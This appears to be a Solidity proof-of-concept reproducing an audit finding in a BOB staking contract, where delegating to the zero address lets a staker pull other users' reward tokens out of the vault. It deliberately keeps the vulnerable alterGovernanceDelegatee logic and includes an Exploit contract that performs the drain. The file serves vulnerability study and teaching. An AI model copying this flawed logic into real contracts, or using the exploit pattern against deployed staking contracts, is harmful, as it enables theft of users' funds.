// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    BOB Staking — Delegating to address(0) empties contract via alterGovernanceDelegatee
    (Pashov Audit Group, BOB-Staking 2025-10-18, finding #63720)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: alterGovernanceDelegatee allows newDelegatee = address(0).
    After a prior non-zero delegation, setting delegatee to 0 moves tokens
    into the zero-address surrogate. The next non-zero re-delegation treats
    governanceDelegatee == 0 as "first delegation" and transfers amountStaked
    from the *staking contract* (other users' funds / rewards) to the new
    surrogate — draining the vault. Vulnerable zero-address path preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

contract DelegationSurrogate {
    constructor(address token, address staking) {
        MockERC20(token).approve(staking, type(uint256).max);
    }
}

/// @notice Reduced BobStaking.alterGovernanceDelegatee drain path.
/// Source: BobStaking.alterGovernanceDelegatee (Pashov BOB-Staking 2025-10-18).
contract BobStaking {
    MockERC20 public immutable stakingToken;

    struct Staker {
        uint256 amountStaked;
        address governanceDelegatee;
    }

    mapping(address => Staker) public stakers;
    mapping(address => DelegationSurrogate) public storedSurrogates;
    mapping(address => bool) public whitelistedDelegatee;

    constructor(MockERC20 _token) {
        stakingToken = _token;
    }

    function setWhitelistedDelegatee(address d, bool ok) external {
        whitelistedDelegatee[d] = ok;
    }

    function stake(uint256 amount, address receiver, uint80 /*lock*/) external {
        require(amount > 0, "zero");
        stakingToken.transferFrom(msg.sender, address(this), amount);
        stakers[receiver].amountStaked += amount;
    }

    function depositRewardTokens(uint256 amount) external {
        stakingToken.transferFrom(msg.sender, address(this), amount);
    }

    function alterGovernanceDelegatee(address newDelegatee) external {
        Staker storage staker = stakers[msg.sender];
        if (staker.governanceDelegatee == newDelegatee) revert("DelegateeUnchanged");
        if (staker.amountStaked == 0) revert("ZeroTokenStake");

        // FIX: revert if newDelegatee == address(0); do not treat 0 as undelegated for transfers
        DelegationSurrogate newSurrogate = _fetchOrDeploySurrogate(newDelegatee);

        if (staker.governanceDelegatee == address(0)) { // @> VULN: after address(0) delegate, re-pulls amountStaked from contract (rewards)
            // First time delegation (or after delegating to 0): pull from THIS contract
            stakingToken.transfer(address(newSurrogate), staker.amountStaked);
        } else {
            DelegationSurrogate oldSurrogate = storedSurrogates[staker.governanceDelegatee];
            stakingToken.transferFrom(address(oldSurrogate), address(newSurrogate), staker.amountStaked);
        }

        staker.governanceDelegatee = newDelegatee;
    }

    function _fetchOrDeploySurrogate(address delegatee) internal returns (DelegationSurrogate s) {
        s = storedSurrogates[delegatee];
        if (address(s) == address(0)) {
            s = new DelegationSurrogate(address(stakingToken), address(this));
            storedSurrogates[delegatee] = s;
        }
    }
}

/// @notice Drain rewards by cycling delegatee → address(0) → delegatee.
/// CREATE order: token (1), staking (2).
contract Exploit {
    MockERC20 public token;
    BobStaking public staking;

    uint256 public drained;
    uint256 public contractBalanceAfter;

    constructor() {
        token = new MockERC20("BOB", "BOB"); // 1
        staking = new BobStaking(token); // 2
    }

    function run() external {
        // Deposit 1000e18 reward tokens into staking
        token.mint(address(this), 1000e18);
        token.approve(address(staking), type(uint256).max);
        staking.depositRewardTokens(1000e18);

        // Attacker stakes 1 ether
        token.mint(address(this), 1e18);
        staking.stake(1e18, address(this), 0);

        address delegatee = address(0xD1);
        staking.setWhitelistedDelegatee(delegatee, true);

        uint256 contractBalanceBefore = token.balanceOf(address(staking));
        // 1000 rewards + 1 stake = 1001e18

        // First delegation: moves 1e18 stake from contract → surrogate
        staking.alterGovernanceDelegatee(delegatee);
        require(token.balanceOf(address(staking)) == 1000e18, "only stake left rewards");

        // Delegate to address(0): moves tokens old surrogate → zero surrogate
        staking.alterGovernanceDelegatee(address(0));

        // Re-delegate to delegatee: treated as first-time → pulls 1e18 from CONTRACT (rewards)
        staking.alterGovernanceDelegatee(delegatee);

        contractBalanceAfter = token.balanceOf(address(staking));
        drained = contractBalanceBefore - contractBalanceAfter;

        // Harm: contract lost 2 * stakedAmount (one legitimate stake move + one stolen from rewards)
        require(drained == 2e18, "drained 2 ether from contract balance view");
        require(contractBalanceAfter == 999e18, "rewards reduced by 1 ether");

        // Attacker controls 2e18 in surrogates (own 1e18 + stolen 1e18)
        uint256 s0 = token.balanceOf(address(staking.storedSurrogates(address(0))));
        uint256 s1 = token.balanceOf(address(staking.storedSurrogates(delegatee)));
        require(s0 + s1 == 2e18, "tokens in surrogates");
        require(s1 == 1e18, "stolen chunk on surrogate");
    }
}
